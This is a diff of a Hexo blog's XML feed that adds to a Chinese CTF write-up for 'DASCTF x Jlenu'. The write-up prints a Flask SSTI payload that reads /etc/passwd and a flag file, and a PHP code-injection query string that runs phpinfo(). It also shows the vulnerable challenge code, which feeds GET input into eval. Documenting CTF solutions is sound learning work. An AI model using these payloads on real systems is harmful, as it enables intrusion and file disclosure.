@@ -4706,17 +4706,24 @@ public function __toString()&#123;
   </entry>
   <entry>
     <title>Dasctf x Jlenu</title>
-    <url>/2021/10/25/ctf/Jlenu/</url>
+    <url>/2021/10/25/ctf/Dasctf%20x%20Jlenu/</url>
     <content><![CDATA[<p> 这次坐大牢，web做不出来==</p>
 <p> 在一个大佬点拨下，懂得misc的签到用ssti注入做（虽然迟了点交flag)</p>
-<p> 直接网上查到payload：<a href="https://www.cnblogs.com/hackxf/p/10480071.html">python-flask-ssti(模版注入漏洞) - 晓枫v5 - 博客园 (cnblogs.com)</a></p>
+<h2 id="WELCOME-DASCTFxJlenu"><a href="#WELCOME-DASCTFxJlenu" class="headerlink" title="WELCOME DASCTFxJlenu"></a>WELCOME DASCTFxJlenu</h2><p> 直接网上查到payload：<a href="https://www.cnblogs.com/hackxf/p/10480071.html">python-flask-ssti(模版注入漏洞) - 晓枫v5 - 博客园 (cnblogs.com)</a></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;a&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/25/ctf/Jlenu/blog/source/_posts/ctf/Jlenu/image-20211025224845346.png" alt="image-20211025224845346"></p>
+<p><img src="/2021/10/25/ctf/Dasctf%20x%20Jlenu/image-20211025224845346.png"></p>
 <p>然后试探查看，最后</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;a&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;flag.txt&#39;).read()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/10/25/ctf/Jlenu/image-20211025225751134.png" alt="image-20211025225751134"></p>
+<p><img src="/2021/10/25/ctf/Dasctf%20x%20Jlenu/image-20211025225751134.png"></p>
+<h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><p>今天用问到的payload复现了一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?action&#x3D;add&amp;attrid[]&#x3D;1&amp;attrvalue[]&#x3D;2&quot;);phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/25/ctf/Dasctf%20x%20Jlenu/image-20211026111906974.png"></p>
+<p>代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">extract($_GET);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">String2Array</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>($data == <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="string">&quot;\$array = <span class="subst">$data</span>;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_array($attrid) &amp;&amp; is_array($attrvalue))</span><br><span class="line">&#123;</span><br><span class="line">    $attrstr .= <span class="string">&#x27;array(&#x27;</span>;</span><br><span class="line">    $attrids = count($attrid);</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;$attrids; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">      $attrstr .= <span class="string">&#x27;&quot;&#x27;</span>.intval($attrid[$i]).<span class="string">&#x27;&quot;=&gt;&#x27;</span>.<span class="string">&#x27;&quot;&#x27;</span>.$attrvalue[$i].<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">      <span class="keyword">if</span>($i &lt; $attrids<span class="number">-1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        $attrstr .= <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $attrstr .= <span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String2Array($attrstr);</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>ctf</tag>
